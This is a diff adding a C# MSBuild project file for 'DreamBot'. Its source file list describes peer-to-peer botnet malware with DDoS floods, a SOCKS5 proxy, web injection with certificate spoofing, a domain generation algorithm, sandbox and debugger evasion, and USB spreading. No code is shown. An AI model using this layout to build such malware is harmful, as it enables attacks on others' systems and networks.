@@ -1,0 +1,152 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{2292594A-DEAA-4E38-B794-ACAF9400448A}</ProjectGuid>
+    <OutputType>Exe</OutputType>
+    <AppDesignerFolder>Properties</AppDesignerFolder>
+    <RootNamespace>DreamBot</RootNamespace>
+    <AssemblyName>DreamBot</AssemblyName>
+    <TargetFrameworkVersion>v2.0</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <TargetFrameworkProfile />
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>
+    </DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup />
+  <PropertyGroup>
+    <StartupObject>DreamBot.DreamBotApp</StartupObject>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="System" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Actions\DDoS\Attack.cs" />
+    <Compile Include="Actions\DDoS\Attacker.cs" />
+    <Compile Include="Actions\DDoS\HttpFlood.cs" />
+    <Compile Include="Actions\DDoS\SynFlood.cs" />
+    <Compile Include="Actions\DDoS\UdpFlood.cs" />
+    <Compile Include="Actions\Socks5\Socks5Server.cs" />
+    <Compile Include="Actions\Socks5\Socks.cs" />
+    <Compile Include="Actions\Socks5\SocksClient.cs" />
+    <Compile Include="Actions\Socks5\SocksRequest.cs" />
+    <Compile Include="Actions\Socks5\SocksTunnel.cs" />
+    <Compile Include="Network\Comunication\TCP\TcpTunnel.cs" />
+    <Compile Include="Actions\WebInject\Class1.cs" />
+    <Compile Include="Actions\WebInject\HttpClient.cs" />
+    <Compile Include="Network\DnsEndPoint.cs" />
+    <Compile Include="Network\Sockets.cs" />
+    <Compile Include="Network\Comunication\TCP\TcpClient.cs" />
+    <Compile Include="Network\Comunication\TCP\ClientEventArgs.cs" />
+    <Compile Include="Network\Comunication\TCP\DataEventArgs.cs" />
+    <Compile Include="Actions\WebInject\CertificateCache.cs" />
+    <Compile Include="Actions\WebInject\CertificateProvider.cs" />
+    <Compile Include="ColorConsoleTraceListener.cs" />
+    <Compile Include="Crypto\Cipher.cs" />
+    <Compile Include="Crypto\Mod2.cs" />
+    <Compile Include="Crypto\RC4.cs" />
+    <Compile Include="Crypto\Signature.cs" />
+    <Compile Include="Debugging\Dumper.cs" />
+    <Compile Include="DGA\Dga.cs" />
+    <Compile Include="DreamBotApp.cs" />
+    <Compile Include="Logger.cs" />
+    <Compile Include="Network\Comunication\ComunicationManager.cs" />
+    <Compile Include="Network\ConnectivityTester.cs" />
+    <Compile Include="Network\Comunication\Listeners\ListenerBase.cs" />
+    <Compile Include="Network\Comunication\Listeners\NewConnectionEventArgs.cs" />
+    <Compile Include="Network\Comunication\Listeners\TcpListener.cs" />
+    <Compile Include="Network\Protocol\Messages\MessageManager.cs" />
+    <Compile Include="Network\Protocol\Messages\MessageMetadata.cs" />
+    <Compile Include="Network\BotIdentifier.cs" />
+    <Compile Include="Network\InvalidMessageException.cs" />
+    <Compile Include="Network\Protocol\Messages\System\HelloReplyMessage.cs" />
+    <Compile Include="Network\Protocol\Peers\BotPackage.cs" />
+    <Compile Include="Network\Protocol\Peers\DesparateModeActivatedEventArgs.cs" />
+    <Compile Include="Network\Protocol\Peers\PeerList.cs" />
+    <Compile Include="Network\SFP\F.cs" />
+    <Compile Include="RemoveAttribute.cs" />
+    <Compile Include="System\DateTimeProvider.cs" />
+    <Compile Include="System\Evation\AntiDebugging.cs" />
+    <Compile Include="System\Evation\SandboxDetection.cs" />
+    <Compile Include="Network\Comunication\IMessageSender.cs" />
+    <Compile Include="Network\Protocol\Handlers\HelloReplyMessageHandler.cs" />
+    <Compile Include="Network\Protocol\Handlers\InvalidMessageHandler.cs" />
+    <Compile Include="Network\Protocol\Messages\InvalidMessage.cs" />
+    <Compile Include="Network\Comunication\Listeners\MessageListener.cs" />
+    <Compile Include="Network\Protocol\Peers\PeerManager.cs" />
+    <Compile Include="Network\Protocol\Peers\PeerInfo.cs" />
+    <Compile Include="Crypto\RsaUtils.cs" />
+    <Compile Include="Network\Protocol\Handlers\HelloMessageHandler.cs" />
+    <Compile Include="Network\Protocol\Handlers\GetPeerListReplyMessageHandler.cs" />
+    <Compile Include="Network\Protocol\Handlers\GetPeerListMessageHandler.cs" />
+    <Compile Include="Network\Protocol\Handlers\MessageHandler.cs" />
+    <Compile Include="Network\Protocol\Messages\Command\Command.cs" />
+    <Compile Include="Network\Protocol\Messages\MessageHeader.cs" />
+    <Compile Include="Network\Protocol\Messages\PeerMessage.cs" />
+    <Compile Include="Network\Comunication\ReplyWait.cs" />
+    <Compile Include="Spread\Usb.cs" />
+    <Compile Include="System\Firewall.cs" />
+    <Compile Include="System\NativeMethods.cs" />
+    <Compile Include="System\SystemInfo.cs" />
+    <Compile Include="Utils\Action.cs" />
+    <Compile Include="Utils\BufferUtils.cs" />
+    <Compile Include="Utils\IPAddressExtensions.cs" />
+    <Compile Include="Network\Comunication\ReplyWaitManager.cs" />
+    <Compile Include="Utils\RandomUtils.cs" />
+    <Compile Include="Utils\RegistryUtils.cs" />
+    <Compile Include="Utils\StreamTunnel.cs" />
+    <Compile Include="Workers\BackgroundWorker.cs" />
+    <Compile Include="Utils\BlockingPool.cs" />
+    <Compile Include="Utils\BlockingQueue.cs" />
+    <Compile Include="Workers\ClientWorker.cs" />
+    <Compile Include="Utils\Events.cs" />
+    <Compile Include="Network\Protocol\Messages\System\GetPeerListReplyMessage.cs" />
+    <Compile Include="Workers\IWorker.cs" />
+    <Compile Include="Network\Protocol\Messages\System\GetPeerListMessage.cs" />
+    <Compile Include="Utils\Guard.cs" />
+    <Compile Include="Network\Protocol\Messages\System\HelloMessage.cs" />
+    <Compile Include="Network\Protocol\Messages\Message.cs" />
+    <Compile Include="Workers\ScheduledAction.cs" />
+    <Compile Include="Workers\TimedWorker.cs" />
+    <Compile Include="Network\Comunication\Listeners\UdpListener.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Network\Comunication\Listeners\UdpPacketReceivedEventArgs.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="Actions\WebInject\digitrustroot.cer" />
+    <None Include="App.config" />
+    <None Include="Crypto\PrivateKey.pem" />
+    <None Include="Crypto\PublicKey.pub" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="Actions\WebInject\mc.exe" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+  <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
+       Other similar extension points exist, see Microsoft.Common.targets.
+  <Target Name="BeforeBuild">
+  </Target>
+  <Target Name="AfterBuild">
+  </Target>
+  -->
+</Project>
